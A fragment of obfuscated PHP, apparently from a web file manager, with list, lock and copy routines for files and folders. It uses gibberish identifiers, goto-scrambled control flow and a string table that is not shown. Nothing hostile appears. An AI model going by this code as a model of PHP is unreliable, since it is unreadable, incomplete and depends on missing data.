$eÉá‰è†‡Ç[467]; goto EÛ«„ŒµÛË; b…¬‰° ´ì: $eÉá‰è†‡Ç =& $_SERVER[Õİõş]; if (intval($AÃáôõÙÎ‹[$eÉá‰è†‡Ç[367]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($fø·‹é¹, $EÚÀÕó®´Ë) && $AÃáôõÙÎ‹[$eÉá‰è†‡Ç[365]] != $fø·‹é¹) { return; } goto cÙİ‰÷ùÚÃ; EÛ«„ŒµÛË: } protected function _listAppendPathRoot(&$C¾÷ùàÁ¬Ì, $DëÃõ³ç) { $dğÍŞÛÇŞë =& $_SERVER[Õİõş]; $b›Ïñ¬¨–° = $dğÍŞÛÇŞë[33]; if ($C¾÷ùàÁ¬Ì[$dğÍŞÛÇŞë[367]] == self::TYPE_USER) { if (defined($dğÍŞÛÇŞë[422]) && $C¾÷ùàÁ¬Ì[$dğÍŞÛÇŞë[451]] == USER_ID) { $b›Ïñ¬¨–° = LNG($dğÍŞÛÇŞë[468]); if (!$DëÃõ³ç) { $C¾÷ùàÁ¬Ì[$dğÍŞÛÇŞë[28]] = $b›Ïñ¬¨–°; } } else { $fÎ§ëÇÎÛò = Model($dğÍŞÛÇŞë[469])->getInfoSimple($C¾÷ùàÁ¬Ì[$dğÍŞÛÇŞë[451]]); $b›Ïñ¬¨–° = LNG($dğÍŞÛÇŞë[470]) . $dğÍŞÛÇŞë[153] . $fÎ§ëÇÎÛò[$dğÍŞÛÇŞë[28]] . $dğÍŞÛÇŞë[471]; } } else { if ($C¾÷ùàÁ¬Ì[$dğÍŞÛÇŞë[367]] == self::TYPE_GROUP) { $fÎ§ëÇÎÛò = Model($dğÍŞÛÇŞë[453])->getInfoSimple($C¾÷ùàÁ¬Ì[$dğÍŞÛÇŞë[451]]); $b›Ïñ¬¨–° = $fÎ§ëÇÎÛò[$dğÍŞÛÇŞë[28]]; } else { if ($C¾÷ùàÁ¬Ì[$dğÍŞÛÇŞë[367]] == self::TYPE_SYSTEM) { $fÎ§ëÇÎÛò = $this->sourceInfo($DëÃõ³ç[0], !0); $b›Ïñ¬¨–° = $fÎ§ëÇÎÛò[$dğÍŞÛÇŞë[28]]; } } } $b›Ïñ¬¨–° = $b›Ïñ¬¨–° ? $dğÍŞÛÇŞë[8] . $b›Ïñ¬¨–° . $dğÍŞÛÇŞë[8] : $dğÍŞÛÇŞë[8]; return $b›Ïñ¬¨–°; } protected function _listAppendUser(&$aÇ±Üƒè•å) { $aÃö†‚Ïè™ =& $_SERVER[Õİõş]; $cèô÷ŞÉˆ„ = array_to_keyvalue($aÇ±Üƒè•å, $aÃö†‚Ïè™[33], $aÃö†‚Ïè™[374]); $a ‹½‘“Ÿ = array_to_keyvalue($aÇ±Üƒè•å, $aÃö†‚Ïè™[33], $aÃö†‚Ïè™[375]); $fà ²³¶Œ = array_merge($cèô÷ŞÉˆ„, $a ‹½‘“Ÿ); $EÇ°œ‡öæª = Model($aÃö†‚Ïè™[472])->userListInfo($fà ²³¶Œ); foreach ($aÇ±Üƒè•å as &$Fî÷Šæµá½) { $eĞ­ÔÅ¥º = $Fî÷Šæµá½[$aÃö†‚Ïè™[374]]; $Fî÷Šæµá½[$aÃö†‚Ïè™[374]] = $EÇ°œ‡öæª[$eĞ­ÔÅ¥º] ? $EÇ°œ‡öæª[$eĞ­ÔÅ¥º] : !1; $eĞ­ÔÅ¥º = $Fî÷Šæµá½[$aÃö†‚Ïè™[375]]; $Fî÷Šæµá½[$aÃö†‚Ïè™[375]] = $EÇ°œ‡öæª[$eĞ­ÔÅ¥º] ? $EÇ°œ‡öæª[$eĞ­ÔÅ¥º] : !1; if (isset($Fî÷Šæµá½[$aÃö†‚Ïè™[412]]) && $Fî÷Šæµá½[$aÃö†‚Ïè™[412]][$aÃö†‚Ïè™[473]]) { $BƒÈ£Çæ³ø = $GLOBALS[$aÃö†‚Ïè™[6]][$aÃö†‚Ïè™[84]][$aÃö†‚Ïè™[474]]; if ($Fî÷Šæµá½[$aÃö†‚Ïè™[412]][$aÃö†‚Ïè™[475]] <= time() - $BƒÈ£Çæ³ø) { $this->metaSet($Fî÷Šæµá½[$aÃö†‚Ïè™[365]], $aÃö†‚Ïè™[473], null); $this->metaSet($Fî÷Šæµá½[$aÃö†‚Ïè™[365]], $aÃö†‚Ïè™[475], null); unset($Fî÷Šæµá½[$aÃö†‚Ïè™[412]][$aÃö†‚Ïè™[473]]); continue; } $A‘®¨Ù˜„ = $Fî÷Šæµá½[$aÃö†‚Ïè™[412]][$aÃö†‚Ïè™[473]]; $Fî÷Šæµá½[$aÃö†‚Ïè™[412]][$aÃö†‚Ïè™[476]] = Model($aÃö†‚Ïè™[472])->getInfoSimpleOuter($A‘®¨Ù˜„); } } } public function parentLevelArray($Cİ¯·ÓéŠÇ) { $dºÂíİŒÅ =& $_SERVER[Õİõş]; $Cİ¯·ÓéŠÇ = explode($dºÂíİŒÅ[47], trim($Cİ¯·ÓéŠÇ, $dºÂíİŒÅ[47])); return array_remove_value($Cİ¯·ÓéŠÇ, $dºÂíİŒÅ[463]); } public function listAll($EàÖªÊìÄ·) { goto b¢ª‹¤‹ˆ´; c´íì‡¼ï: $e…®—’˜Ùâ = array_to_keyvalue($e…®—’˜Ùâ, $aË„ê•†ò[365]); $FªêçĞŞ·ˆ = "\x2f{$e‘ÖÄ¢‚¿î[$aË„ê•†ò[28]]}\x2f"; $FªêçĞŞ·ˆ = $FªêçĞŞ·ˆ == $aË„ê•†ò[462] ? $aË„ê•†ò[8] : $FªêçĞŞ·ˆ; goto C“ï¢„‡ù›; bë©‹ÎÖ: $this->_listAppendAuth($e…®—’˜Ùâ); $this->_listAppendUser($e…®—’˜Ùâ); $this->_listAppendPath($e…®—’˜Ùâ); goto c´íì‡¼ï; b¢ª‹¤‹ˆ´: $aË„ê•†ò =& $_SERVER[Õİõş]; $e‘ÖÄ¢‚¿î = $this->sourceInfo($EàÖªÊìÄ·); $C®Œ„ÑÔ = array($aË„ê•†ò[477] => array($aË„ê•†ò[478], $e‘ÖÄ¢‚¿î[$aË„ê•†ò[454]] . $EàÖªÊìÄ· . $aË„ê•†ò[479]), $aË„ê•†ò[480] => 0); goto Fõ›Œè†„®; Fõ›Œè†„®: $eÊºĞğ›èß = $aË„ê•†ò[481]; $EæŠ½»Šé = "\x4c\105\x46\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\x66\x69\154\x65\40\x66\x69\x6c\145\40\x6f\x6e\40\x73\157\165\x72\143\x65\56\146\151\x6c\x65\111\104\40\x3d\x20\146\151\154\x65\x2e\x66\x69\154\145\111\104"; $e…®—’˜Ùâ = $this->alias($aË„ê•†ò[482])->field($eÊºĞğ›èß)->where($C®Œ„ÑÔ)->join($EæŠ½»Šé)->select(); goto bë©‹ÎÖ; C“ï¢„‡ù›: $EÏïóí—Á = array(); foreach ($e…®—’˜Ùâ as $dô– ÇÃ‘Ü => $Eãïªİà›ì) { goto FÆÂŒ´é«‹; FÆÂŒ´é«‹: $B¦êÎ‚Ç¹ó = $this->parentLevelArray($Eãïªİà›ì[$aË„ê•†ò[454]]); array_shift($B¦êÎ‚Ç¹ó); $B°¢â¼Ú¢ = $FªêçĞŞ·ˆ; goto f‡©õÃê„; f‡©õÃê„: for ($e’©¢Íïè¬ = 0; $e’©¢Íïè¬ < count($B¦êÎ‚Ç¹ó); $e’©¢Íïè¬++) { $B°¢â¼Ú¢ .= $e…®—’˜Ùâ[$B¦êÎ‚Ç¹ó[$e’©¢Íïè¬]][$aË„ê•†ò[28]] . $aË„ê•†ò[8]; } $B°¢â¼Ú¢ .= $Eãïªİà›ì[$aË„ê•†ò[28]]; if ($Eãïªİà›ì[$aË„ê•†ò[366]]) { $B°¢â¼Ú¢ .= $aË„ê•†ò[8]; } goto b¿ùİºƒŸ; b¿ùİºƒŸ: $B°¢â¼Ú¢ = str_replace($aË„ê•†ò[462], $aË„ê•†ò[8], $B°¢â¼Ú¢); $B°¢â¼Ú¢ = str_replace($aË„ê•†ò[462], $aË„ê•†ò[8], $B°¢â¼Ú¢); $BË‹Á£“Õô = array($aË„ê•†ò[383] => str_replace($aË„ê•†ò[462], $aË„ê•†ò[8], $B°¢â¼Ú¢), $aË„ê•†ò[483] => intval($Eãïªİà›ì[$aË„ê•†ò[366]]), $aË„ê•†ò[387] => $this->pathInfoFilter($Eãïªİà›ì, !0)); goto C¾ã—Óˆ; C¾ã—Óˆ: if (!$Eãïªİà›ì[$aË„ê•†ò[366]]) { $BË‹Á£“Õô[$aË„ê•†ò[414]] = $Eãïªİà›ì[$aË„ê•†ò[414]]; $BË‹Á£“Õô[$aË„ê•†ò[484]] = $Eãïªİà›ì[$aË„ê•†ò[75]]; } $EÏïóí—Á[] = $BË‹Á£“Õô; goto A×ÓŸ í½ù; A×ÓŸ í½ù: } return $EÏïóí—Á; goto CÍ‚Á®ø·‚; CÍ‚Á®ø·‚: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($FÉ–ŒÅ‚¸È) { goto DŞ‘Ê¼‰Û; DŞ‘Ê¼‰Û: $eÎ¬‰…¹®‡ =& $_SERVER[Õİõş]; if (!$this->allowLock()) { return; } $this->_lockCheck($eÎ¬‰…¹®‡[485], $FÉ–ŒÅ‚¸È); goto eƒî‚÷‰ì; Eê¶Ğ»àÚ: $this->_lockEvent($FÉ–ŒÅ‚¸È, array($eÎ¬‰…¹®‡[488], $eÎ¬‰…¹®‡[489]), $bÙ÷‚¥—ƒ›); $this->_lockCheckEnd($eÎ¬‰…¹®‡[485], $FÉ–ŒÅ‚¸È); goto DÀˆ‡÷ŒªÕ; eƒî‚÷‰ì: $bÙ÷‚¥—ƒ› = 1; $this->_lockEvent($FÉ–ŒÅ‚¸È, array($eÎ¬‰…¹®‡[486], $eÎ¬‰…¹®‡[487]), $bÙ÷‚¥—ƒ›); $this->_lockParent($FÉ–ŒÅ‚¸È, array($eÎ¬‰…¹®‡[487]), $bÙ÷‚¥—ƒ›); goto Eê¶Ğ»àÚ; DÀˆ‡÷ŒªÕ: } public function lockCopyEnd($cÍã‘ÓÕˆÚ) { $d²ƒÉğÑÅ =& $_SERVER[Õİõş]; if (!$this->allowLock()) { return; } $aš†½¡Ù¬ã = 0; $this->_lockEvent($cÍã‘ÓÕˆÚ, array($d²ƒÉğÑÅ[486], $d²ƒÉğÑÅ[487]), $aš†½¡Ù¬ã); $this->_lockParent($cÍã‘ÓÕˆÚ, array($d²ƒÉğÑÅ[487]), $aš†½¡Ù¬ã); $this->_lockEvent($cÍã‘ÓÕˆÚ, array($d²ƒÉğÑÅ[488], $d²ƒÉğÑÅ[489]), $aš†½¡Ù¬ã); } public function lockWriteStart($B½­•¨¿±…, $E´©ÀˆíÍ“ = '') { goto aä‘¯¿Š; A‘Üá•š“ê: $this->_lockParent($B½­•¨¿±…, array($bÆ½Şğ‡°Ü[485], $bÆ½Şğ‡°Ü[487]), $e¹ƒÉŞ¶¿ò); $this->_lockCheckEnd($bÆ½Şğ‡°Ü[486], $B½­•¨¿±…); goto D‹çŒÉ; d”À”—«Šå: $e¹ƒÉŞ¶¿ò = 1; $this->_lockKey($bÆ½Şğ‡°Ü[490] . $B½­•¨¿±… . $bÆ½Şğ‡°Ü[91] . $E´©ÀˆíÍ“, $e¹ƒÉŞ¶¿ò); $this->_lockEvent($B½­•¨¿±…, array($bÆ½Şğ‡°Ü[485], $bÆ½Şğ‡°Ü[487]), $e¹ƒÉŞ¶¿ò); goto A‘Üá•š“ê; aä‘¯¿Š: $bÆ½Şğ‡°Ü =& $_SERVER[Õİõş]; if (!$this->allowLock()) { return; } $this->_lockCheck($bÆ½Şğ‡°Ü[486], $B½­•¨¿±…); goto d”À”—«Šå; D‹çŒÉ: } public function lockWriteEnd($aò©Ä¤Æ­Ñ, $D÷‰º³„¨Ì = '') { $b¡†¬Í»ßÃ =& $_SERVER[Õİõş]; if (!$this->allowLock()) { return; } $fœƒ äÆ‘ç = 0; $this->_lockKey($b¡†¬Í»ßÃ[490] . $aò©Ä¤Æ­Ñ . $b¡†¬Í»ßÃ[91] . $D÷‰º³„¨Ì, $fœƒ äÆ‘ç); $this->_lockEvent($aò©Ä¤Æ­Ñ, array($b¡†¬Í»ßÃ[485], $b¡†¬Í»ßÃ[487]), $fœƒ äÆ‘ç); $this->_lockParent($aò©Ä¤Æ­Ñ, array($b¡†¬Í»ßÃ[485], $b¡†¬Í»ßÃ[487]), $fœƒ äÆ‘ç); } public function lockMoveStart($fº›Œæä„Ì) { goto eª³â…ÚÓ; A Á·Ù‡ÌØ: $this->_lockParent($fº›Œæä„Ì, array($cöîÖĞ‹À§[485], $cöîÖĞ‹À§[487]), $Fïğ¨¥Àˆ“); $this->_lockEvent($fº›Œæä„Ì, array($cöîÖĞ‹À§[492], $cöîÖĞ‹À§[488], $cöîÖĞ‹À§[489]), $Fïğ¨¥Àˆ“); $this->_lockCheckEnd($cöîÖĞ‹À§[487], $fº›Œæä„Ì); goto eˆçÛõ±; B³ãˆŸ÷“: $Fïğ¨¥Àˆ“ = 1; $this->_lockKey($cöîÖĞ‹À§[491] . $fº›Œæä„Ì, $Fïğ¨¥Àˆ“); $this->_lockEvent($fº›Œæä„Ì, array($cöîÖĞ‹À§[485], $cöîÖĞ‹À§[486]), $Fïğ¨¥Àˆ“); goto A Á·Ù‡ÌØ; eª³â…ÚÓ: $cöîÖĞ‹À§ =& $_SERVER[Õİõş]; if (!$this->allowLock()) { return; } $this->_lockCheck($cöîÖĞ‹À§[487], $fº›Œæä„Ì); goto B³ãˆŸ÷“; eˆçÛõ±: } public function lockMoveEnd($A‡„Õ”ÓÄ) { goto BÁÌ¸“–Á; bŸ¬ÇçĞò¯: $this->_lockEvent($A‡„Õ”ÓÄ, array($DË«éİµĞ[492], $DË«éİµĞ[488], $DË«éİµĞ[489]), $aŞÍ‹íÒ“½); goto eáÆ¨à¤õ; d°ŠÁòš»®: $this->_lockKey($DË«éİµĞ[491] . $A‡„Õ”ÓÄ, $aŞÍ‹íÒ“½); $this->_lockEvent($A‡„Õ”ÓÄ, array($DË«éİµĞ[485], $DË«éİµĞ[486]), $aŞÍ‹íÒ“½); $this->_lockParent($A‡„Õ”ÓÄ, array($DË«éİµĞ[485], $DË«éİµĞ[487]), $aŞÍ‹íÒ“½); goto bŸ¬ÇçĞò¯; BÁÌ¸“–Á: $DË«éİµĞ =& $_SERVER[Õİõş]; if (!$this->allowLock()) { return; } $aŞÍ‹íÒ“½ = 0; goto d°ŠÁòš»®; eáÆ¨à¤õ: } private function _lockCheck($B‡ä–±ò¬İ, $Cç¯¥Í‡Çá) { goto CÀŸâ›ùä; c»•‘éÕĞ¦: CacheLock::setErrorMsg($cÆçœ‘å‡[153] . htmlspecialchars($e¢äô·â›ˆ[$cÆçœ‘å‡[28]]) . $cÆçœ‘å‡[471] . $BâŒ…‘Ì); $this->_lockKey($e±ˆ²‘Â¤, 1); $this->_lockKey($e±ˆ²‘Â¤, 0); goto C‘ÁØŞéì·; CÀŸâ›ùä: $cÆçœ‘å‡ =& $_SERVER[Õİõş]; $e¢äô·â›ˆ = $this->sourceInfo($Cç¯¥Í‡Çá); $e±ˆ²‘Â¤ = $B‡ä–±ò¬İ . $cÆçœ‘å‡[91] . $Cç¯¥Í‡Çá; goto A”–º›‚Äø; A”–º›‚Äø: $this->_lockTimeStart[$e±ˆ²‘Â¤] = timeFloat(); if (!is_array($e¢äô·â›ˆ)) { return; } $BâŒ…‘Ì = LNG($cÆçœ‘å‡[493]); goto c»•‘éÕĞ¦; C‘ÁØŞéì·: $E“”½Ö†‹ = array_reverse($this->parentLevelArray($e¢äô·â›ˆ[$cÆçœ‘å‡[454]])); foreach ($E“”½Ö†‹ as $däÒ¦À‰¸) { $e±ˆ²‘Â¤ = $B‡ä–±ò¬İ . $cÆçœ‘å‡[494] . $däÒ¦À‰¸; if (CacheLock::lockGet($cÆçœ‘å‡[495] . $e±ˆ²‘Â¤)) { $e¢äô·â›ˆ = $this->sourceInfo($däÒ¦À‰¸); CacheLock::setErrorMsg($cÆçœ‘å‡[153] . htmlspecialchars($e¢äô·â›ˆ[$cÆçœ‘å‡[28]]) . $cÆçœ‘å‡[471] . $BâŒ…‘Ì); $this->_lockKey($e±ˆ²‘Â¤, 1); $this->_lockKey($e±ˆ²‘Â¤, 0); } } goto bŞĞ›Àá—; bŞĞ›Àá—: } private function _lockCheckEnd($Dõ³ğ‡º®, $f‡Ó‚ò´Ç) { goto FÉˆ°ŒŞæÉ; fùÉ¯Ğ¬©ù: if (!isset($this->_lockTimeStart[$aŠÓñ½Ëƒµ])) { return; } $a¥’ø°Ò‡Å = timeFloat() - $this->_lockTimeStart[$aŠÓñ½Ëƒµ]; unset($this->_lockTimeStart[$aŠÓñ½Ëƒµ]); goto BàÅÖ•‚¾ç; FÉˆ°ŒŞæÉ: $aö¡®³Æ² =& $_SERVER[Õİõş]; $aŠÓñ½Ëƒµ = $Dõ³ğ‡º® . $aö¡®³Æ²[91] . $f‡Ó‚ò´Ç; CacheLock::setErrorMsg($aö¡®³Æ²[357]); goto fùÉ¯Ğ¬©ù; BàÅÖ•‚¾ç: if ($a¥’ø°Ò‡Å > 0.5) { unset(self::$cacheSourceInfo[$aö¡®³Æ²[405] . $f‡Ó‚ò´Ç]); } $fáÀî¡é—Í = $this->sourceInfo($f‡Ó‚ò´Ç); if (!$fáÀî¡é—Í) { show_json(LNG($aö¡®³Æ²[100]), !1); } goto AÊêİ‡ø©ê; AÊêİ‡ø©ê: } private function _lockParent($A†ÆöÕØö , $C‚¦Œô¾Î, $DŸÂ¥§ùöª) { if (!$this->autoLockSet) { return; } $cÇ‘Ñ–´³È = $this->sourceInfo($A†ÆöÕØö ); if (!is_array($cÇ‘Ñ–´³È)) { return; } $A„¬öÍà“Ë = array_reverse($this->parentLevelArray($cÇ‘Ñ–´³È[$_SERVER[Õİõş][454]])); foreach ($A„¬öÍà“Ë as $E¬à³‹—) { $this->_lockEvent($E¬à³‹—, $C‚¦Œô¾Î, $DŸÂ¥§ùöª); } } private function _lockEvent($FĞÖòõòêº, $aÒÄÃ¨ƒÃ, $bÚª º±ÄÚ) { $a¡ëë‘ôŠ” =& $_SERVER[Õİõş]; if (!$this->autoLockSet) { return; } foreach ($aÒÄÃ¨ƒÃ as $b‰Å­ÖÛ—) { $bùõéòâ•Ü = $b‰Å­ÖÛ— . $a¡ëë‘ôŠ”[91] . $FĞÖòõòêº; if ($bÚª º±ÄÚ && CacheLock::lockGet($a¡ëë‘ôŠ”[495] . $bùõéòâ•Ü)) { continue; } $this->_lockKey($bùõéòâ•Ü, $bÚª º±ÄÚ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($e­‘š‚Ñ®, $a´‡š¥‚® = 1) { $C«¥ó©¨Ì = $_SERVER[Õİõş][495] . md5($e­‘š‚Ñ®); if ($a´‡š¥‚®) { if (isset(self::$_lockItemArr[$C«¥ó©¨Ì])) { return; } self::$_lockItemArr[$C«¥ó©¨Ì] = 1; CacheLock::lock($C«¥ó©¨Ì, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$C«¥ó©¨Ì])) { return; } unset(self::$_lockItemArr[$C«¥ó©¨Ì]); CacheLock::unlock($C«¥ó©¨Ì); } } public function isParentOf($fê…¶†·™í, $B‹Î÷Û ˆ±) { goto BÍÚÁÉŒÕò; BØ•’‘†¾: return $cáòª‚¤š£; goto BáŠÒ‰µ¼; BÍÚÁÉŒÕò: $EÁ‰Úµ®ˆ =& $_SERVER[Õİõş]; $fÆøì—¬ = $this->sourceInfo($fê…¶†·™í); $DÕ¼­ï°–æ = $this->sourceInfo($B‹Î÷Û ˆ±); goto E„¹î˜ğ±Â; E„¹î˜ğ±Â: $b‚­®Ê•¼Û = $fÆøì—¬[$EÁ‰Úµ®ˆ[454]] . $fÆøì—¬[$EÁ‰Úµ®ˆ[365]] . $EÁ‰Úµ®ˆ[47]; $a‘‰ÑÈ‹¦’ = $DÕ¼­ï°–æ[$EÁ‰Úµ®ˆ[454]] . $DÕ¼­ï°–æ[$EÁ‰Úµ®ˆ[365]] . $EÁ‰Úµ®ˆ[47]; $cáòª‚¤š£ = strpos($a‘‰ÑÈ‹¦’, $b‚­®Ê•¼Û) === 0; goto BØ•’‘†¾; BáŠÒ‰µ¼: } private $targetIsDelete = 0; public function copy($C·‹ë˜¹‹Ş, $BçÇğ„ÄÚß, $bÚ¨¶§«÷‘ = REPEAT_REPLACE, $FöÆÅœğ‹Ï = '') { goto A½¢Åô±¡•; DÕò±¥Ô¯÷: if (!$f‘ÆÜÙêñ¡ || !$Fî‘ùÌÎó || $Fî‘ùÌÎó[$a¼·¯Øä¬[366]] != $a¼·¯Øä¬[83]) { return !1; } if ($this->isParentOf($C·‹ë˜¹‹Ş, $BçÇğ„ÄÚß)) { return !1; } $c…Ëƒ©‹Ç = $FöÆÅœğ‹Ï ? $FöÆÅœğ‹Ï : $f‘ÆÜÙêñ¡[$a¼·¯Øä¬[28]]; goto EˆÂÊ’‹“³; cµ‡‹¯ÛÄ¨: $this->targetIsDelete = intval($f‘ÆÜÙêñ¡[$a¼·¯Øä¬[392]]); $A¼®¢É·µ´ = $this->fileNameExistCache($BçÇğ„ÄÚß, $f‘ÆÜÙêñ¡[$a¼·¯Øä¬[28]]); $BÑ÷ó‡™±ó = $this->_copy($C·‹ë˜¹‹Ş, $BçÇğ„ÄÚß, $bÚ¨¶§«÷‘, $C—Âæ½”­, !0, $FöÆÅœğ‹Ï); goto C¢—Ü„á; EˆÂÊ’‹“³: $this->lockCopyStart($C·‹ë˜¹‹Ş); $this->lockWriteStart($BçÇğ„ÄÚß, $c…Ëƒ©‹Ç); $C—Âæ½”­ = array($a¼·¯Øä¬[496] => array(), $a¼·¯Øä¬[497] => array(), $a¼·¯Øä¬[498] => array()); goto cµ‡‹¯ÛÄ¨; A½¢Åô±¡•: $a¼·¯Øä¬ =& $_SERVER[Õİõş]; $f‘ÆÜÙêñ¡ = $this->sourceInfo($C·‹ë˜¹‹Ş); $Fî‘ùÌÎó = $this->sourceInfo($BçÇğ„ÄÚß); goto DÕò±¥Ô¯÷; C¢—Ü„á: $this->_childrenListClear(); $this->lockCopyEnd($C·‹ë˜¹‹Ş); $this->lockWriteEnd($BçÇğ„ÄÚß, $c…Ëƒ©‹Ç); goto B“·µó‡ÄÆ; a’ß£„Ô¼í: $this->saveAll($C—Âæ½”­[$a¼·¯Øä¬[498]]); Model($a¼·¯Øä¬[163])->linkAdd($C—Âæ½”­[$a¼·¯Øä¬[496]]); $this->folderSizeReset($BçÇğ„ÄÚß); goto A‡æ¤Â‚„„; A‡æ¤Â‚„„: $this->updateModifyTime($BçÇğ„ÄÚß); return $BÑ÷ó‡™±ó; goto béÁñ­ó; B“·µó‡ÄÆ: if ($f‘ÆÜÙêñ¡[$a¼·¯Øä¬[366]] == $a¼·¯Øä¬[83] && $A¼®¢É·µ´ == $BÑ÷ó‡™±ó) { $this->folderSizeResetChildren($A¼®¢É·µ´); } Model($a¼·¯Øä¬[499])->addAll($C—Âæ½”­[$a¼·¯Øä¬[497]], array(), !0); if ($A¼®¢É·µ´ != $BÑ÷ó‡™±ó || $f‘ÆÜÙêñ¡[$a¼·¯Øä¬[366]] == $a¼·¯Øä¬[83]) { Model($a¼·¯Øä¬[500])->eventCopy($BÑ÷ó‡™±ó); } goto a’ß£„Ô¼í; béÁñ­ó: } private function _copy($EÁ®‹œ¾Åà, $Aßö¹Š¹˜Û, $cëÔ„Ô‡, &$f¡î„òÈ’ó, $Bƒ„‚Ëí‰», $C ‚·•¥¡È = '') { goto e¾¶§ÊìŸ; FõöÓ†È‹ï: if (!$DËâêøç×Ì) { return $this->_copyCreate($EÁ®‹œ¾Åà, $Aßö¹Š¹˜Û, $EØÄòÔå“ô, $f¡î„òÈ’ó); } $cŠÈÎô× = $DËâêøç×Ì; if ($AÈù¨†Ÿ•á) { if ($cëÔ„Ô‡ == REPEAT_RENAME_FOLDER) { $EØÄòÔå“ô = $this->fileNameAutoCache($Aßö¹Š¹˜Û, $EØÄòÔå“ô, $cëÔ„Ô‡, $AÈù¨†Ÿ•á); $cŠÈÎô× = $this->_copyCreate($EÁ®‹œ¾Åà, $Aßö¹Š¹˜Û, $EØÄòÔå“ô, $f¡î„òÈ’ó); } else { $fÁ•ß»ñÛÌ = $this->_childrenList($EÁ®‹œ¾Åà); foreach ($fÁ•ß»ñÛÌ as $eŞ¿’ĞˆéÑ) { $this->_copy($eŞ¿’ĞˆéÑ[$b¥Õ¨ƒÃ¸Á[365]], $DËâêøç×Ì, $cëÔ„Ô‡, $f¡î„òÈ’ó, !1); } } } else { if ($cëÔ„Ô‡ == REPEAT_RENAME || $cëÔ„Ô‡ == REPEAT_RENAME_FOLDER) { $EØÄòÔå“ô = $this->fileNameAutoCache($Aßö¹Š¹˜Û, $EØÄòÔå“ô, $cëÔ„Ô‡, $AÈù¨†Ÿ•á); $cŠÈÎô× = $this->_copyCreate($EÁ®‹œ¾Åà, $Aßö¹Š¹˜Û, $EØÄòÔå“ô, $f¡î„òÈ’ó); } else { if ($cëÔ„Ô‡ == REPEAT_REPLACE) { $cå½…İæ»ì = $this->sourceInfoCache($DËâêøç×Ì); $f‚Ş­•ä±ƒ = $this->fileHistory($cå½…İæ»ì, $fç·õŸÎâ±[$b¥Õ¨ƒÃ¸Á[414]], $fç·õŸÎâ±[$b¥Õ¨ƒÃ¸Á[77]]); if ($f‚Ş­•ä±ƒ) { $f¡î„òÈ’ó[$b¥Õ¨ƒÃ¸Á[496]][] = $fç·õŸÎâ±[$b¥Õ¨ƒÃ¸Á[414]]; } } else { if ($cëÔ„Ô‡ == REPEAT_SKIP) { } } } Hook::trigger($b¥Õ¨ƒÃ¸Á[501], array($b¥Õ¨ƒÃ¸Á[502], $fç·õŸÎâ±, 0)); } goto fÇáïõ”; CŒ¡Ÿç¬ˆİ: $EØÄòÔå“ô = $C ‚·•¥¡È ? $C ‚·•¥¡È : $fç·õŸÎâ±[$b¥Õ¨ƒÃ¸Á[28]]; $DËâêøç×Ì = $this->fileNameExistCache($Aßö¹Š¹˜Û, $EØÄòÔå“ô); if ($Bƒ„‚Ëí‰») { $this->_childrenAllMake($EÁ®‹œ¾Åà); if ($AÈù¨†Ÿ•á && $DËâêøç×Ì) { $this->_childrenAllMake($DËâêøç×Ì); } } goto FõöÓ†È‹ï; fÇáïõ”: return $cŠÈÎô×; goto a¶ò§„„‡Ø; e¾¶§ÊìŸ: $b¥Õ¨ƒÃ¸Á =& $_SERVER[Õİõş]; $fç·õŸÎâ± = $this->sourceInfoCache($EÁ®‹œ¾Åà); $AÈù¨†Ÿ•á = $fç·õŸÎâ±[$b¥Õ¨ƒÃ¸Á[366]] == $b¥Õ¨ƒÃ¸Á[83]; goto CŒ¡Ÿç¬ˆİ; a¶ò§„„‡Ø: } private function _copyCreate($f½¶»‡ã™ô, $bÄˆ¦èò•«, $DÉêİ·«ãÉ, &$C‰íğ¨øâ”) { goto A‘×Ü óŸ; A‘×Ü óŸ: $AÃğ‚£àİ =& $_SERVER[Õİõş]; $F¡ÁÆÕÒ£³ = $this->sourceInfoCache($f½¶»‡ã™ô); $eàŒƒ«ˆ¢ = $this->sourceInfoCache($bÄˆ¦èò•«); goto e¯ß‰•Şùæ; bÌŒ†¥‡½™: if ($F¡ÁÆÕÒ£³[$AÃğ‚£àİ[366]] != $AÃğ‚£àİ[83]) { $C‰íğ¨øâ”[$AÃğ‚£àİ[496]][] = $F¡ÁÆÕÒ£³[$AÃğ‚£àİ[414]]; return $e½İ—Ÿ¡¦Û; } $Aø¯£õ = array(); $F‰ÛÃïæóÄ = array(); goto FÕ¤¨†çÄ—; e¯ß‰•Şùæ: $fâ ´·Ş´³ = $this->_makeItemData($F¡ÁÆÕÒ£³, $eàŒƒ«ˆ¢, $DÉêİ·«ãÉ); Hook::trigger($AÃğ‚£àİ[503], $fâ ´·Ş´³); Hook::trigger($AÃğ‚£àİ[504], array($AÃğ‚£àİ[505], $fâ ´·Ş´³, 0)); goto bÅ„æóÓ¶; bÅ„æóÓ¶: $e½İ—Ÿ¡¦Û = $this->add($fâ ´·Ş´³); $Bµöä‹…Š× = array($AÃğ‚£àİ[365] => $e½İ—Ÿ¡¦Û, $AÃğ‚£àİ[28] => $DÉêİ·«ãÉ); $this->_copyApplyMeta($Bµöä‹…Š×, $C‰íğ¨øâ”); goto bÌŒ†¥‡½™; f‡ê©îÓİ¾: $e¨ƒ¾†â¡  = $this->sourceInfo($e½İ—Ÿ¡¦Û); foreach ($Aø¯£õ as $FÈˆÊó°¢±) { $aù¹ˆÈÈš = $this->_makeItemData($FÈˆÊó°¢±, $e¨ƒ¾†â¡ , $FÈˆÊó°¢±[$AÃğ‚£àİ[28]]); $aù¹ˆÈÈš[$AÃğ‚£àİ[454]] = $FÈˆÊó°¢±[$AÃğ‚£àİ[454]]; $F‰ÛÃïæóÄ[] = $aù¹ˆÈÈš; } $this->chunkEventSet($AÃğ‚£àİ[506], array($AÃğ‚£àİ[507], $fâ ´·Ş´³, $dÍ”ĞŒè×)); goto fÃÚ«Çª˜; FÕ¤¨†çÄ—: $this->_childrenListAll($f½¶»‡ã™ô, $Aø¯£õ); $dÍ”ĞŒè× = count($Aø¯£õ); if ($dÍ”ĞŒè× == 0) { return $e½İ—Ÿ¡¦Û; } goto f‡ê©îÓİ¾; A£¤ª‚‹ˆ‘: $eÜåÑè×õØ[$f½¶»‡ã™ô] = $e½İ—Ÿ¡¦Û; $e„Ö¹õõ¢ç = array(); $Eö»‡“ğâœ = array(); goto FˆˆìéÓö¾; 